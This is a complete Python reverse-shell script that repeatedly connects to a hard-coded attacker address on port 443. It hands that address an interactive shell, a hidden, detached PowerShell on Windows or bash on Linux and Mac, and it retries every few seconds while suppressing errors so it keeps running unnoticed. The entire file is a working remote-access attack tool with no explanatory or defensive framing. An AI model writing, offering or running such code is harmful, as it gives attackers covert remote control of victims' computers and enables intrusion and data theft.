import socket
import os
import sys
import subprocess
import time

ATTACKER_IP = "192.168.1.77"
PORT = 443

def stable_shell():
    while True:
        try:
            # Create new socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect((ATTACKER_IP, PORT))
            
            # Platform-specific shell handling
            if sys.platform == "win32":
                # Windows PowerShell with proper I/O
                subprocess.Popen(
                    ["powershell.exe", "-NoProfile", "-Command", "-"],
                    stdin=s.fileno(),
                    stdout=s.fileno(),
                    stderr=s.fileno(),
                    creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS
                )
            else:
                # Linux/Mac full interactive shell
                os.dup2(s.fileno(), 0)
                os.dup2(s.fileno(), 1)
                os.dup2(s.fileno(), 2)
                os.setsid()  # Create new session
                subprocess.Popen(
                    ["/bin/bash", "-i"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
            
            # Keep connection alive
            while True:
                data = s.recv(1024)
                if not data:
                    break
                time.sleep(0.1)
                
        except Exception as e:
            time.sleep(5)
            continue
            
        finally:
            try:
                s.close()
            except:
                pass

if __name__ == "__main__":
    stable_shell()
